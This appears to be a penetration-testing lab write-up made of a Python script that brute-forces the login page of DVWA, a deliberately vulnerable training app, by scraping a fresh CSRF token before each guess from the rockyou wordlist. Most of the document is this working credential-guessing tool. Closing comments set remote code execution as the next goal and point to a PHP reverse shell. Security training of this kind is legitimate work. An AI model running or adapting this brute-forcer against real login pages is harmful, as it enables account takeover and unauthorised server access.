############################################################################
#PWNing DVWA and brute forcing through regenerative CSRF tokens [IMPOSSIBLE DIFFICULTY]

#We will make our own brute forcing script to abuse the CSRF not being tied to a session cookie, this means our python script doesn’t need to dynamically update cookies and we can simply update a new CSRF token with each password request (not supported in hydra without scripting).

############################################################################

import requests
from bs4 import BeautifulSoup

# Target URL
LOGIN_URL = "http://192.168.1.13/DVWA/login.php"

# Username to brute force
username = "admin"

# Path to your password list
password_file = "user/share/wordlists/rockyou.txt"

def get_csrf_token(session):
    #parse CSRF token
    resp = session.get(LOGIN_URL)
    soup = BeautifulSoup(resp.text, 'html.parser')
    token_input = soup.find('input', {'name': 'user_token'})
    if not token_input:
        print("CSRF token input not found on login page.")
        return None
    return token_input['value']

def attempt_login(session, username, password, token):
    #Send POST login request with token, username, and password.
    data = {
        'username': username,
        'password': password,
        'Login': 'Login',     
        'user_token': token
    }
    resp = session.post(LOGIN_URL, data=data)
    return resp

def main():
    with open(password_file, 'r', encoding='latin-1') as f:
        passwords = [line.strip() for line in f]

    session = requests.Session()

    for password in passwords:
        token = get_csrf_token(session)
        if not token:
            print("Failed to get CSRF token, aborting.")
            break

        response = attempt_login(session, username, password, token)

        if "Login failed" not in response.text:
            print(f"[+] Password found: {password}")
            break
        else:
            print(f"[+] Tried password: {password}")
#for some reason the script literally blows up without this
if __name__ == "__main__":
    main()

############################################################################
#This script runs for a bit and then gets us our password even though they require a unique CSRF token for each login attempt, we still brute force it by making our own tooling. 

#Once we have access to the web server we will want to get into it and control it. By the .php extension in the login form we know the server is using PHP.

#So now our objective is to find a way to get remote code execution to spawn a shell. https://github.com/pentestmonkey/php-reverse-shell